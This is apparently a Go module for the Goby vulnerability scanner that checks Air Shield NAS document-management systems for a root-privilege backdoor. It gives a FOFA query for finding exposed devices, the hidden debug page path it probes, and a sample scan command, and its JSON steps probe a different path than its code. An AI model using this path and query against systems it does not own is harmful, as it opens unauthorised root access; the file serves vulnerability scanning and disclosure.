package exploits

import (
    "fmt"
    "git.gobies.org/goby/goscanner/goutils"
    "git.gobies.org/goby/goscanner/jsonvul"
    "git.gobies.org/goby/goscanner/scanconfig"
    "git.gobies.org/goby/httpclient"
    "strings"
)

//规则没有

func init() {
    expJson := `{
    "Name": "Air Shield NAS electronic document security management system root privilege backdoor",
    "Description": "<p>On the basis of security management standards, AirShield NAS electronic document security management system realizes functions such as rapid transfer of large files in the information system through technologies such as security level control and file exchange control. </p><p>The system has a root privilege backdoor that can control the device.</p>",
    "Product": "Air Shield NAS",
    "Homepage": "http://www.fhjs.casic.cn/",
    "DisclosureDate": "2021-06-01",
    "Author": "mayi",
    "FofaQuery": "body=\"航盾NAS\"",
    "GobyQuery": "body=\"航盾NAS\"",
    "Level": "3",
    "Impact": "<p>There is a backdoor vulnerability in the Air Shield NAS electronic document security management system, and attackers can gain root shell privileges by accessing web page information.</p>",
    "VulType": [
        "Backdoor"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Is0day": true,
    "Recommendation": "<p>1.Delete the backdoor-like web pages.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "Translation": {
        "CN": {
            "Name": "航盾NAS电子文档安全管理系统root权限后门",
            "Product": "航盾NAS电子文档安全管理系统",
            "Description": "<p>航盾NAS电子文档安全管理系统在安全管理标准的基础上，通过密级控制、文件交换控制等技术实现信息系统内大文件快速传递等功能。</p><p>该系统存在root权限后门，可控制设备。</p>",
            "Recommendation": "<p>1、删除该后门类似网页。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>航盾NAS电子文档安全管理系统存在后门漏洞，攻击者通过访问网页信息获取root shell权限。</p>",
            "VulType": [
                "后门"
            ],
            "Tags": [
                "后门",
                "信创"
            ]
        },
        "EN": {
            "Name": "Air Shield NAS electronic document security management system root privilege backdoor",
            "Product": "Air Shield NAS",
            "Description": "<p>On the basis of security management standards, AirShield NAS electronic document security management system realizes functions such as rapid transfer of large files in the information system through technologies such as security level control and file exchange control. </p><p>The system has a root privilege backdoor that can control the device.</p>",
            "Recommendation": "<p>1.Delete the backdoor-like web pages.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is a backdoor vulnerability in the Air Shield NAS electronic document security management system, and attackers can gain root shell privileges by accessing web page information.</p>",
            "VulType": [
                "Backdoor"
            ],
            "Tags": [
                "Backdoor",
                "Information technology application innovation industry"
            ]
        }
    },
    "References": [],
    "HasExp": false,
    "ExpParams": [],
    "ScanSteps": [
        null
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Backdoor",
        "Information technology application innovation industry"
    ],
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "航盾NAS电子文档安全管理系统"
        ]
    },
    "PocId": "7365"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
            nashttp:=httpclient.NewGetRequestConfig("/sp/debught3pki2002_login.jsp")
            if resp, err := httpclient.DoHttpRequest(u, nashttp); err == nil {
                fmt.Printf(resp.RawBody)
                if strings.Contains(resp.Status, "200") {
                    return true
                }
            }

            return false
        },
        nil,
    ))
}
//       ./goscanner -m HandunNAS_backdoor -t 172.16.14.133
